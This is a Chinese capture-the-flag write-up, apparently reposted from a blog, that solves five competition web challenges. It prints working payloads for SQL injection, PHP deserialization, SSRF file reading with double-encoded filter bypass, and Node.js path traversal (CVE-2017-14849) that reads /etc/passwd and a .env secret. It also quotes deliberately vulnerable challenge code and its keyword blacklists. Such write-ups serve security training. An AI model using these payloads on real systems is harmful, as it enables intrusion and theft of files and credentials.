# 网络安全管理职业技能竞赛Web writeup_合天网安学院-程序员宝宝 - 程序员宝宝
## 网络安全管理职业技能竞赛 Web writeup\_合天网安学院 - 程序员宝宝

技术标签： [ext](/searchArticle?qc=ext&page=1 "ext")  [CTF](/searchArticle?qc=CTF&page=1 "CTF")  [nagios](/searchArticle?qc=nagios&page=1 "nagios")  [ado.net](/searchArticle?qc=ado.net&page=1 "ado.net")  [sdl](/searchArticle?qc=sdl&page=1 "sdl")  [openssh](/searchArticle?qc=openssh&page=1 "openssh")  

如果你也想练习 CTF，请点击[CTF 实验室](https://www.hetianlab.com/pages/CTFLaboratory.jsp?pk_campaign=CSDN-wemedia)

**Web**

**0x01 easy_sql**

一开始看到是 easysql，那就先上 sqlmap 跑跑看，跑出了数据库名 security 以及若干表名

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpXZWlhbWljc2tWTVFvTlRZbkIxQWNlZ2V3Z01nMk1kWkhQOU1tMGhIU3NGN1F4YlJqVFpXelltQS82NDA?x-oss-process=image/format,png)

继续跑 flag，结果没跑出来，最后还是上手工了。

测试输入一个单引号，页面无反应，但是在源码中发现了又报错信息

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHo2b0FUaWFReW9taWFEN0Yyd3B4NTBwRWRkT2NpYzBLS3lzUTIyN1o5SlBCNHBGODQwVDhHRHlPSmcvNjQw?x-oss-process=image/format,png)

接着用单引号和括号闭合，报错注入，之后想了一下，为什么页面没有回显呢，原来是因为错误信息居然显示白色，前期被骗了很久，用鼠标描一下即可看到。

    uname=aaa') or updatexml(1,concat(0x7e,mid((select * from flag),1,25)),1)%23&passwd=bbbb 

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpKemtXY3o5V3d0dXlXa0JxMTlwUmNCOXJXQ0g5NUEzUlNmU0xtelhsRkc2aGYyM2tYaWNidk53LzY0MA?x-oss-process=image/format,png)

    uname=aaa') OR updatexml(1,concat(0x7e,mid((select * from flag),23,50)),1)%23&passwd=bbbb 

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpjZDlZWjJSQUVSV0JyQ3lwaFVNZlE0YURnc05iZm9BN3Uxb1ZpYUtHbEdpYXg0RW9PMkVmZEo4QS82NDA?x-oss-process=image/format,png)

**0x02 ezsqli**

开局一个输入框

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpuSWtVMkk1WlZIU1Joakg2RDlRZ2gxdE5iQkpQTEFaZmlhSENueklpYWFVc1NaWFJ4cVVZSXFsQS82NDA?x-oss-process=image/format,png)

查看 hint 得到源码

```php
    //a "part" of the source code here

    function sqlWaf($s)
    {
        $filter = '/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|<|;|"|\^|\||\ |\'/i';
        if (preg_match($filter,$s))
            return False;
        return True;
    }

    if (isset($_POST['username']) && isset($_POST['password'])) {

        if (!isset($_SESSION['VerifyCode']))
                die("?");

        $username = strval($_POST['username']);
        $password = strval($_POST['password']);

        if ( !sqlWaf($password) )
            alertMes('damn hacker' ,"./index.php");

        $sql = "SELECT * FROM users WHERE username='${username}' AND password= '${password}'";
    //    password format: /[A-Za-z0-9]/
        $result = $conn->query($sql);
        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            if ( $row['username'] === 'admin' && $row['password'] )
            {
                if ($row['password'] == $password)
                {
                    $message = $FLAG;
                } else {
                    $message = "username or password wrong, are you admin?";
                }
            } else {
                $message = "wrong user";
            }
        } else {
            $message = "user not exist or wrong password";
        }
    }
    ?> 
```

password 被过滤了，usename 没有过滤，使用联合查询，构造 username 和 password 返回 admin 即可

    username=admin1'+union+select+'admin','admin','admin'%23&password=admin&captcha=LSOK 

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpsYnJUVUFMMHZtTTZXejFaTUVxVk4zTmpMTmxoTWhWVHJVN082MzNEOHA1Z1Ftam4xRk9YMFEvNjQw?x-oss-process=image/format,png)

0x03 warmup

下载源码开始审计，在 index.php 中发现了 unserialize，估计是考察反序列化的利用了

```php
···
if (isset ($_COOKIE['last_login_info'])) {
    $last_login_info = unserialize (base64_decode ($_COOKIE['last_login_info']));
    try {
        if (is_array($last_login_info) && $last_login_info['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('WAF info: your ip status has been changed, you are dangrous.');
        }
    } catch(Exception $e) {
        die('Error');
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('last_login_info', $cookie, time () + (86400 * 30));
}
··· 
```

conn.php 源码

```php
    include 'flag.php';

     class SQL {
        public $table = '';
        public $username = '';
        public $password = '';
        public $conn;
        public function __construct() {
        }

        public function connect() {
            $this->conn = new mysqli("localhost", "xxxxx", "xxxx", "xxxx");
        }

        public function check_login(){
            $result = $this->query();
            if ($result === false) {
                die("database error, please check your input");
            }
            $row = $result->fetch_assoc();
            if($row === NULL){
                die("username or password incorrect!");
            }else if($row['username'] === 'admin'){
                $flag = file_get_contents('flag.php');
                echo "welcome, admin! this is your flag -> ".$flag;
            }else{
                echo "welcome! but you are not admin";
            }
            $result->free();
        }

        public function query() {
            $this->waf();
            return $this->conn->query ("select username,password from ".$this->table." where username='".$this->username."' and password='".$this->password."'");
        }

        public function waf(){
               $blacklist = ["union", "join", "!", "\"", "#", "$", "%", "&", ".", "/", ":", ";", "^", "_", "`", "{", "|", "}", "<", ">", "?", "@", "[", "\\", "]" , "*", "+", "-"];
               foreach ($blacklist as $value) {
                      if(strripos($this->table, $value)){
                             die('bad hacker,go out!');
                      }
               }
            foreach ($blacklist as $value) {
                if(strripos($this->username, $value)){
                    die('bad hacker,go out!');
                }
            }
            foreach ($blacklist as $value) {
                if(strripos($this->password, $value)){
                    die('bad hacker,go out!');
                }
            }
        }

        public function __wakeup(){
            if (!isset ($this->conn)) {
                $this->connect ();
            }
            if($this->table){
                $this->waf();
            }
            $this->check_login();
            $this->conn->close();
        }

    }
    ?> 
```

可以看到在 check_login 中，有个 flag 的输出点，前提是我们需要伪造成 admin 用户

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHo5aEw1ODFLRjhxU2I5Sjk2ZFlZUHRlWVJMcW1rQVJtd3VpY0NXZmNSSEhRSVVlWnFWVGljVmtEdy82NDA?x-oss-process=image/format,png)

继续往下看，有个执行 SQL 语句的地方

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpCa2pWVWliTVp2YzJoZHBWUElLZkk4aWIzWDdwaDRrS01UZ1ZXemU1aWNqOWo3bXVYUEJIdlVXS1EvNjQw?x-oss-process=image/format,png)

```php
 public function query() {
        $this->waf();
        return $this->conn->query ("select username,password from ".$this->table." where username='".$this->username."' and password='".$this->password."'");
    } 
```

下面还有个 waf，看了一下，发现我们需要构造的万能密码所用到的字符不会被 ban

```php
$blacklist = ["union", "join", "!", "\"", "#", "$", "%", "&", ".", "/", ":", ";", "^", "_", "`", "{", "|", "}", "<", ">", "?", "@", "[", "\\", "]" , "*", "+", "-"];
           foreach ($blacklist as $value) {
                  if(strripos($this->table, $value)){
                         die('bad hacker,go out!');
                  }
           } 
```

所以这里我们可以利用 SQL 注入来变成 admin 登录，username 改为 admin，password 为万能密码 a'or'1'='1，代码如下：
```php
    include "conn.php";
    $sql = new SQL();
    $sql->table = "users";
    $sql->username = "admin";
    $sql->password = "a'or'1'='1";
    $a = serialize($sql);
    echo $a;
    echo base64_encode ($a); 
```
得到

```
TzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MTA6ImEnb3InMSc9JzEiO3M6NDoiY29ubiI7Tjt9，
```

输入之后获得flag 

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpsdUgyaWMyblVCSEJlc1g5M093QlRQaWJpYzlyYjRYYjFEd0xsNFVPWGs2b0Vab21ZMVBPOWljWVJ3LzY0MA?x-oss-process=image/format,png)

**0x04 ssrfME**

访问可以看到有两个输入点，一个可以输入 url，一个是验证码

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpxcjFGRWlhVkRrT3JPSjEyS3hmaWFpY1M4RlRLZzFCNlIwRjJSa2tUaWEyR0VmZ012Wk9UQWs1NkZBLzY0MA?x-oss-process=image/format,png)

脚本爆破验证

```php
<?php
for ($i=0; $i < 1000000000; $i++) { 
       $a = substr(md5($i), -6, 6);       if ($a == "d17b5b") {              echo $i;              break;       }
}
?> 
```

尝试使用 file 协议读取，发现读取 / etc/passwd 成功

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHplOTdQQjB3RWt3RkcyWVk0TEM0ZnRhaEE5WExGaWFNdVRKRjEzSW1WVWE0RUpNQ1ZCWlFaWFVRLzY0MA?x-oss-process=image/format,png)

读取 / flag，没成功，尝试读取 / var/www/html/index.php，得到源码，原来是有个 waf 过滤了 flag

```php
    ···
    if (isset($_POST['url']) && isset($_POST['captcha']) && !empty($_POST['url']) && !empty($_POST['captcha']))
    {
        $url = $_POST['url'];
        $captcha = $_POST['captcha'];
        $is_post = 1;
        if ( $captcha !== $_SESSION['answer'])
        {
            $die_mess = "wrong captcha";
            $is_die = 1;
        }

        if ( preg_match('/flag|proc|log/i', $url) )
        {
            $die_mess = "hacker";
            $is_die = 1;
        }
    }
    ··· 
```

file 协议读 flag，利用两个 url 编码 flag 绕过

    url=file:///%25%36%36%25%36%63%25%36%31%25%36%37&captcha=43049 

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHprbEk0R29lREhZSjk1NElPOGlheU9mVzdLUVAwb3A1ekVRdUhvQmxTY3FBV1lnQWljSHZPRW9jQS82NDA?x-oss-process=image/format,png)

0x05 SecretGuess

题目给了源码，但是不全

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpJU1U3NHNheW1wRlFEam52bDNWRWZLYVJWZjh5bFVYSVBCUlc1UXBLaWJvVHBicll0WmtQdDN3LzY0MA?x-oss-process=image/format,png)

在 index.html 中发现了 source，点击可以看到源码

```JavaScript
    const express = require('express');
    const path = require('path');
    const env = require('dotenv').config();
    const bodyParser = require('body-parser');
    const crypto = require('crypto');
    const fs = require('fs')
    const hbs = require('hbs');
    const process = require("child_process")

    const app = express();

    app.use('/static', express.static(path.join(__dirname, 'public')));
    app.use(bodyParser.urlencoded({ extended: false }))
    app.use(bodyParser.json());
    app.set('views', path.join(__dirname, "views/"))
    app.engine('html', hbs.__express)
    app.set('view engine', 'html')

    app.get('/', (req, res) => {    res.render("index")
    })

    app.post('/', (req, res) => {    if (req.body.auth && typeof req.body.auth === 'string' && crypto.createHash('md5').update(env.parsed.secret).digest('hex') === req.body.auth ) {        res.render("index", {result: process.execSync("echo $FLAG")})    } else {        res.render("index", {result: "wrong secret"})    }
    })

    app.get('/source', (req, res) => {    res.end(fs.readFileSync(path.join(__dirname, "app.js")))
    })

    app.listen(80, "0.0.0.0"); 
```
在给出 dockerfile 中，文件内容为

    FROM node:8.5
    COPY ./src /usr/local/app
    WORKDIR /usr/local/app
    ENV FLAG=flag{**********}
    RUN npm i --registry=https://registry.npm.taobao.org
    EXPOSE 80
    CMD node /usr/local/app/app.js 

去搜索相关内容，发现了可能会存在 CVE-2017-14849 漏洞

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpMVkpSaWFGWTRraWNDcVhmWjFDcXBaWkVzWW43OVZTdklqNEtSSE96RVE0dDhIcnFBM0RBdjQzUS82NDA?x-oss-process=image/format,png)

输入 / static/../../a/../../..//etc/passwd，利用成功

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpaOTBkcU9JUEkwQjdZZExycEM0aWFlcE1IdFRNcm1oR1JDSXVpYmlhS0psc2pudmVYRUdzcDJmMWcvNjQw?x-oss-process=image/format,png)

接着去获取 secret，/static/../../a/../../../usr/local/app/.env，得到 secret=CVE-2017-14849

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHpUVk9WelNxZ05aMW9EZmNYTVY3OGhCN29mZ0FhdHNSR1Z0MG42SU1mZXYxVFN2NFVyZTNHeFEvNjQw?x-oss-process=image/format,png)

根据源码中的条件

```php
if (req.body.auth && typeof req.body.auth === 'string' && crypto.createHash('md5').update(env.parsed.secret).digest('hex') === req.body.auth ) 
```

我们将 CVE-2017-14849 进行 md5 加密之后提交即可获得 flag，auth=10523ece56c1d399dae057b3ac1ad733

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZjQ5NXZFUzdVUXRlaWM0Z0tRZ1dTWHowWU1qYWR6TUF2aWNpYlV6UkhZeThxUWlhektlQ3dqeDQ0V3ZEQmdrQ0tjY1A4TzFGaWJpYVA2V1RNUS82NDA?x-oss-process=image/format,png)

[](https://creativecommons.org/licenses/by-sa/4.0/)版权声明：本文为博主原创文章，遵循 [CC 4.0 BY-SA](https://creativecommons.org/licenses/by-sa/4.0/) 版权协议，转载请附上原文出处链接和本声明。

本文链接：[https://blog.csdn.net/qq_38154820/article/details/109685538](https://blog.csdn.net/qq_38154820/article/details/109685538)

 [https://www.cxybb.com/article/qq_38154820/109685538](https://www.cxybb.com/article/qq_38154820/109685538)
